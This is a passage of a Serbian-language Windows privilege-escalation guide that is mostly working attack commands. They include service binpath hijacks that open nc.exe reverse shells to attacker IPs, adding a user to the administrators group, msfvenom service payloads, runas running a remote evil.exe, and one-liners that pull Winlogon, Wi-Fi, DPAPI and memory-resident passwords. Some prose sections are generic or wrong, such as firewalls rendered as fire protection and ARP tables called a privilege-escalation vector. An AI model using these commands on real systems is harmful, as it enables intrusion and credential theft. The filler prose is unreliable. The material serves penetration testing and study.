tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proverite da li su pokrenuti mogući **electron/cef/chromium debugeri**, možete ih zloupotrebiti za eskalaciju privilegija.

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola foldera binarnih procesa (DLL Hijacking)**

Da biste identifikovali potencijalne ranjivosti DLL Hijacking-a, treba da proverite dozvole foldera u kojima se nalaze binarne datoteke procesa. Ovo može biti korisno za pronalaženje foldera sa slabim dozvolama koje omogućavaju napadačima da izvrše DLL Hijacking.

Da biste proverili dozvole foldera, možete koristiti sledeće korake:

1. Pokrenite komandnu liniju kao administrator.
2. Koristite komandu `icacls` za prikazivanje dozvola foldera. Na primer, za prikazivanje dozvola foldera "C:\Program Files\MyApp", koristite sledeću komandu:

   ```
   icacls "C:\Program Files\MyApp"
   ```

   Ova komanda će prikazati dozvole za navedeni folder.

3. Pregledajte rezultate i obratite pažnju na bilo kakve dozvole koje omogućavaju izvršavanje datoteka iz tog foldera.

   Na primer, ako vidite da grupa "Svi korisnici" ima dozvolu "Izvršavanje" za određeni folder, to može biti potencijalna ranjivost koju napadač može iskoristiti za DLL Hijacking.

4. Ponovite ovaj postupak za sve relevantne foldere binarnih datoteka procesa.

Nakon što identifikujete foldere sa slabim dozvolama, preporučuje se da promenite dozvole tih foldera kako biste smanjili rizik od DLL Hijacking-a.
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Rudarenje lozinki iz memorije

Možete kreirati memorijski dump pokrenutog procesa koristeći **procdump** iz sysinternals-a. Servisi poput FTP-a imaju **lozinke u čistom tekstu u memoriji**, pokušajte da izvučete memoriju i pročitate lozinke.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nesigurne GUI aplikacije

**Aplikacije koje se izvršavaju kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), pretražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Dobijanje liste servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da biste dobili informacije o usluzi.
```bash
sc qc <service_name>
```
Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_ da biste proverili potrebni nivo privilegija za svaku uslugu.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se da proverite da li "Authenticated Users" mogu da menjaju bilo koji servis:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako imate ovu grešku (na primer sa SSDPSRV):

_Sistemski greška 1058 se desila._\
_Servis ne može biti pokrenut, ili zato što je onemogućen ili zato što nema povezanih uređaja koji su omogućeni._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte u vidu da usluga upnphost zavisi od SSDPSRV da bi radila (za XP SP1)**

**Još jedan način** za rešavanje ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmena putanje binarnog fajla servisa**

U scenariju u kojem grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** na servisu, moguća je izmena izvršnog binarnog fajla servisa. Da biste izmenili i izvršili **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovno pokretanje servisa

Da biste pokrenuli servis na Windows operativnom sistemu, možete koristiti sledeće korake:

1. Otvorite Command Prompt (Komandnu liniju) kao administrator.
2. Unesite komandu `net stop <ime_servisa>` da biste zaustavili servis. Zamijenite `<ime_servisa>` sa stvarnim imenom servisa koji želite da zaustavite.
3. Nakon što je servis zaustavljen, unesite komandu `net start <ime_servisa>` da biste ponovo pokrenuli servis. Opet, zamijenite `<ime_servisa>` sa stvarnim imenom servisa koji želite da pokrenete.

Nakon što izvršite ove korake, servis će biti ponovo pokrenut na Windows operativnom sistemu.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije mogu biti povećane kroz različite dozvole:
- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarne datoteke servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što dovodi do mogućnosti promene konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracija servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti, može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole binarnih datoteka servisa

**Proverite da li možete izmeniti binarnu datoteku koju izvršava servis** ili da li imate **dozvole za pisanje u folderu** gde se nalazi binarna datoteka ([**DLL Hijacking**](dll-hijacking.md))**.**\
Možete dobiti svaku binarnu datoteku koju izvršava servis koristeći **wmic** (ne u system32) i proveriti vaše dozvole koristeći **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Možete koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmenu registra usluga

Treba da proverite da li možete izmeniti bilo koji registar usluga.\
Možete **proveriti** svoje **dozvole** nad registrom usluga koristeći:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Potrebno je proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako je to slučaj, binarni fajl koji izvršava servis može biti promenjen.

Da biste promenili putanju izvršnog binarnog fajla:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dozvole za dodavanje podataka/izrada poddirektorijuma u registru usluga

Ako imate ovu dozvolu nad registrom, to znači da **možete kreirati podregistre iz ovog registra**. U slučaju Windows usluga, ovo je **dovoljno za izvršavanje proizvoljnog koda**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Neispravni putanje usluga

Ako putanja do izvršne datoteke nije unutar navodnika, Windows će pokušati izvršiti svaki završetak prije razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati izvršiti:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
## Lista svih putanja nekodiranih servisa, isključujući one koje pripadaju ugrađenim Windows servisima:

Da biste pronašli sve putanje nekodiranih servisa, možete koristiti sledeći PowerShell skript:

```powershell
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*'} | Select-Object Name, PathName
```

Ovaj skript će vam prikazati sve servise čije putanje nisu kodirane, zajedno sa njihovim imenima i putanjama. Međutim, kako biste isključili ugrađene Windows servise, možete koristiti sledeći skript:

```powershell
$excludedServices = @(
    "wuauserv",
    "BITS",
    "WinRM",
    "W32Time",
    "TrkWks",
    "SENS",
    "Schedule",
    "SamSs",
    "RpcSs",
    "ProfSvc",
    "PlugPlay",
    "NlaSvc",
    "Netman",
    "LanmanServer",
    "LanmanWorkstation",
    "KeyIso",
    "IKEEXT",
    "EventLog",
    "Dnscache",
    "CryptSvc",
    "Browser",
    "Appinfo"
)

Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.Name -notin $excludedServices } | Select-Object Name, PathName
```

Ovaj skript koristi niz `$excludedServices` koji sadrži imena ugrađenih Windows servisa koje želite isključiti. Skript će prikazati samo servise čije putanje nisu kodirane i ne pripadaju ugrađenim Windows servisima.
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete otkriti i iskoristiti** ovu ranjivost pomoću metasploita: `exploit/windows/local/trusted\_service\_path`
Možete ručno kreirati binarnu uslugu pomoću metasploita:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcije oporavka

Windows omogućava korisnicima da odrede akcije koje će se preduzeti ako servis ne uspe. Ova funkcija može biti konfigurisana da upućuje na binarni fajl. Ako je ovaj binarni fajl zamenjiv, moguće je izvršiti eskalaciju privilegija. Više detalja možete pronaći u [zvaničnoj dokumentaciji](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole binarnih fajlova** (možda možete prebrisati jedan i izvršiti eskalaciju privilegija) i **foldera** ([DLL preusmeravanje](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete izmeniti neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da li možete izmeniti neki binarni fajl koji će biti izvršen od strane administratorskog naloga (schedtasks).

Način da pronađete slabe dozvole za fascikle/datoteke u sistemu je sledeći:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Pokretanje pri pokretanju sistema

**Proverite da li možete prebrisati neki registar ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o interesantnim **lokacijama za pokretanje privilegija**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Drajveri

Potražite moguće **treće strane čudne/vulnerabilne** drajvere
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Ako imate **dozvole za pisanje unutar foldera koji se nalazi na PATH-u**, možda ćete moći da preuzmete kontrolu nad DLL-om koji je učitan od strane procesa i **povećate privilegije**.

Proverite dozvole svih foldera unutar PATH-a:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu provjeru, pogledajte:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Mreža

### Deljenja
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts fajl

Proverite da li postoje drugi poznati računari koji su unapred definisani u hosts fajlu.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi i DNS

#### Pregled

Mrežni interfejsi su odgovorni za povezivanje računara sa mrežom. Svaki računar može imati više mrežnih interfejsa, a svaki od njih ima svoju IP adresu. DNS (Domain Name System) je sistem koji prevodi ljudski čitljive domenske imene u IP adrese.

#### Prikaz mrežnih interfejsa

Da biste prikazali sve mrežne interfejse na Windows operativnom sistemu, možete koristiti sledeću komandu:

```bash
ipconfig /all
```

Ova komanda će prikazati sve informacije o mrežnim interfejsima, uključujući IP adrese, MAC adrese, podrazumevane gateway-e i DNS servere.

#### Promena DNS servera

Da biste promenili DNS server na Windows operativnom sistemu, možete koristiti sledeće korake:

1. Otvorite "Network and Sharing Center" (Centar za mreže i deljenje).
2. Kliknite na "Change adapter settings" (Promeni postavke adaptera).
3. Desni klik na mrežni interfejs za koji želite da promenite DNS server i izaberite "Properties" (Svojstva).
4. Pronađite opciju "Internet Protocol Version 4 (TCP/IPv4)" (Internet protokol verzija 4) i kliknite na "Properties" (Svojstva).
5. Izaberite opciju "Use the following DNS server addresses" (Koristi sledeće adrese DNS servera).
6. Unesite željene DNS server adrese.
7. Kliknite na "OK" da biste sačuvali promene.

#### DNS cache poisoning

DNS cache poisoning je tehnika koja omogućava napadaču da promeni DNS cache kako bi preusmerio korisnike na zlonamerne IP adrese. Da biste izvršili DNS cache poisoning, možete koristiti alate kao što su `dnschef` ili `mitm6`.

#### Zaključak

Mrežni interfejsi i DNS su ključni elementi za povezivanje računara sa mrežom i prevod domenskih imena u IP adrese. Razumevanje ovih koncepta može biti od koristi prilikom rešavanja problema sa mrežnim povezivanjem ili izvođenja napada kao što je DNS cache poisoning.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite **ograničene servise** sa spoljne strane
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja

Tabela rutiranja je struktura podataka koja se koristi u operativnom sistemu Windows kako bi se odredio put kojim će se podaci preusmeriti kroz mrežu. Tabela rutiranja sadrži informacije o različitim mrežnim segmentima i putanjama koje se koriste za slanje podataka do odredišta.

Da biste pregledali trenutnu tabelu rutiranja u operativnom sistemu Windows, možete koristiti naredbu `route print` u komandnoj liniji. Ova naredba će prikazati sve unose u tabeli rutiranja, uključujući IP adrese, mrežne maske, podrazumevane preusmerivače i metrike.

Tabela rutiranja se često koristi u procesu eskalacije privilegija prilikom hakovanja lokalnog sistema. Napadač može da iskoristi slabosti u konfiguraciji rutiranja kako bi preusmerio saobraćaj i dobio neovlašćen pristup određenim resursima ili privilegijama na sistemu.

Važno je da sistem administratori redovno proveravaju i ažuriraju tabelu rutiranja kako bi osigurali sigurnost i integritet mreže.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela

ARP (Address Resolution Protocol) tabela je tabela koja se koristi u mrežnom protokolu kako bi se mapirale IP adrese na MAC adrese. Ova tabela se koristi za efikasno slanje podataka između uređaja u lokalnoj mreži. Kada se podaci šalju na određenu IP adresu, uređaj prvo proverava ARP tabelu da bi pronašao odgovarajuću MAC adresu za tu IP adresu. Ako se MAC adresa ne nalazi u ARP tabeli, uređaj će poslati ARP zahtev kako bi dobio odgovarajuću MAC adresu. Nakon što se MAC adresa dobije, ona se dodaje u ARP tabelu radi budućih referenci.

ARP tabela se često koristi u napadima na lokalno podizanje privilegija. Napadač može da iskoristi ARP tabelu kako bi izvršio napad na mrežu i preuzeo kontrolu nad drugim uređajima. Na primer, napadač može da izmeni ARP tabelu tako da se saobraćaj usmerava prema njegovom uređaju, što mu omogućava da prati ili manipuliše komunikacijom između drugih uređaja. Ovo je samo jedan od mnogih načina na koje se ARP tabela može iskoristiti u napadima na lokalno podizanje privilegija.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Pravila za zaštitu od požara

[**Proverite ovu stranicu za komande vezane za zaštitu od požara**](../basic-cmd-for-pentesters.md#firewall) **(lista pravila, kreiranje pravila, isključivanje, uključivanje...)**

Više [komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows podsistem za Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binarni `bash.exe` takođe se može pronaći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete korisnika sa administratorskim privilegijama, možete osluškivati na bilo kojem portu (prvi put kada koristite `nc.exe` za osluškivanje na portu, pojaviće se GUI prozor koji će vas pitati da li treba dozvoliti `nc` kroz firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati `--default-user root`

Možete istražiti `WSL` datotečni sistem u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows akreditacije

### Winlogon akreditacije
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Upravitelj akreditiva / Windows trezor

Sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows trezor čuva korisničke akreditive za servere, veb sajtove i druge programe koje **Windows** može **automatski prijaviti**. Na prvi pogled, može se činiti da korisnici mogu da čuvaju svoje Facebook akreditive, Twitter akreditive, Gmail akreditive itd., tako da se automatski prijavljuju putem pretraživača. Ali to nije tako.

Windows trezor čuva akreditive koje Windows može automatski prijaviti korisnicima, što znači da bilo koja **Windows aplikacija koja zahteva akreditive za pristup resursu** (serveru ili veb sajtu) **može koristiti ovaj Upravitelj akreditiva i Windows trezor** i koristiti dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Upraviteljem akreditiva, mislim da nije moguće da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi trezor, trebalo bi nekako **komunicirati sa upraviteljem akreditiva i zatražiti akreditive za taj resurs** iz podrazumevanog trezora za skladištenje.

Koristite `cmdkey` da biste prikazali listu sačuvanih akreditiva na računaru.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste koristili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl putem SMB deljenja.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` komande sa pruženim setom akreditacija.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Napomena da se mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), ili iz [Empire Powershells modula](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) mogu dobiti kredencijali.

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, uglavnom korišćen unutar Windows operativnog sistema za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva putem simetričnog ključa koji se dobija iz korisničkih tajni za prijavljivanje**. U scenarijima koji uključuju sistemsko šifrovanje, koristi sistemsku tajnu za autentifikaciju domena.

Šifrovani korisnički RSA ključevi, korišćenjem DPAPI, se čuvaju u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) korisnika. **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisničke privatne ključeve u istom fajlu**, obično se sastoji od 64 bajta slučajnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, sprečavajući prikazivanje sadržaja putem `dir` komande u CMD-u, iako se može prikazati putem PowerShell-a).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz modul** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

Datoteke sa **poverljivim podacima zaštićene glavnim lozinkom** obično se nalaze u:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz modul** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dešifrovali.\
Možete **izvući mnogo DPAPI** **masterključeva** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako ste root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell akreditacije

**PowerShell akreditacije** se često koriste za **skriptiranje** i automatizaciju zadataka kao način za praktično čuvanje šifrovanih akreditacija. Akreditacije su zaštićene pomoću **DPAPI**, što obično znači da se mogu dešifrovati samo od strane istog korisnika na istom računaru na kojem su kreirane.

Da biste **dešifrovali** PS akreditacije iz datoteke koja ih sadrži, možete uraditi sledeće:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Bežična mreža

Wifi je tehnologija koja omogućava bežično povezivanje uređaja na mrežu. Bežična mreža se sastoji od bežičnog rutera koji emituje signale i bežičnih uređaja koji se povezuju na te signale. Wifi omogućava korisnicima da pristupe internetu i deljenim resursima mreže bez potrebe za fizičkim kablovima.

Bežične mreže su popularne zbog svoje praktičnosti i mobilnosti. Međutim, zbog svoje prirode, bežične mreže su podložne određenim sigurnosnim rizicima. Napadači mogu pokušati da iskoriste slabosti u bežičnoj mreži kako bi pristupili osetljivim informacijama ili izvršili zlonamerne aktivnosti.

Da biste zaštitili svoju bežičnu mrežu, preporučuje se primena određenih sigurnosnih mera. Evo nekoliko korisnih saveta:

- Promenite zadate korisničko ime i lozinku za pristup bežičnom ruteru.
- Koristite snažnu lozinku koja se sastoji od kombinacije slova, brojeva i specijalnih znakova.
- Omogućite enkripciju na bežičnoj mreži kako biste sprečili neovlašćeni pristup.
- Isključite funkciju SSID broadcasta kako biste sakrili ime svoje bežične mreže.
- Redovno ažurirajte firmver na bežičnom ruteru kako biste ispravili poznate sigurnosne propuste.
- Koristite firewall kako biste blokirali neželjeni pristup vašoj bežičnoj mreži.

Pravilno konfigurisanje i održavanje bežične mreže može značajno smanjiti rizik od napada i zaštititi vaše podatke.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP konekcije

Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno izvršene komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Upravljač za čuvanje podataka o udaljenom radnom okruženju**

---

#### **Opis**

Udaljeni radni okvir (Remote Desktop) je funkcionalnost koja omogućava korisnicima da pristupe udaljenim računarima i izvršavaju zadatke kao da su fizički prisutni na tim računarima. U operativnom sistemu Windows, korisnički podaci za prijavljivanje na udaljeni radni okvir se čuvaju u Credential Manager-u.

Credential Manager je komponenta operativnog sistema koja čuva korisnička imena i lozinke, kao i druge podatke za prijavljivanje na različite servise i aplikacije. Ovi podaci se čuvaju u obliku takozvanih "credentiala" i mogu biti korišćeni za automatsko prijavljivanje na različite resurse.

Međutim, Credential Manager može biti zloupotrebljen za izvršavanje napada na lokalno podizanje privilegija. Napadač može iskoristiti slabosti u konfiguraciji Credential Manager-a kako bi dobio pristup privilegijama koje mu inače ne bi bile dostupne.

---

#### **Napadni vektor**

Napadač može iskoristiti slabosti u konfiguraciji Credential Manager-a kako bi izvršio napad na lokalno podizanje privilegija. Ovo može uključivati:

- Pronalaženje i iskorišćavanje slabosti u konfiguraciji Credential Manager-a.
- Korišćenje Credential Manager-a za prijavljivanje na udaljene računare sa privilegijama koje mu inače ne bi bile dostupne.
- Manipulisanje podacima u Credential Manager-u kako bi se postigao lokalni privilegijalni pristup.

---

#### **Preventivne mere**

Da biste sprečili napade na lokalno podizanje privilegija putem Credential Manager-a, preporučuje se preduzimanje sledećih mera:

- Redovno ažurirajte operativni sistem i sve instalirane aplikacije kako biste ispravili poznate slabosti.
- Konfigurišite Credential Manager tako da koristi jake lozinke i dvofaktornu autentifikaciju.
- Ograničite pristup Credential Manager-u samo privilegovanim korisnicima.
- Koristite sigurnosne alate i softver za otkrivanje i sprečavanje napada na lokalno podizanje privilegija.

---

#### **Detekcija i rešavanje**

Da biste detektovali i rešili napade na lokalno podizanje privilegija putem Credential Manager-a, možete preduzeti sledeće korake:

- Redovno proveravajte logove događaja operativnog sistema kako biste identifikovali sumnjive aktivnosti.
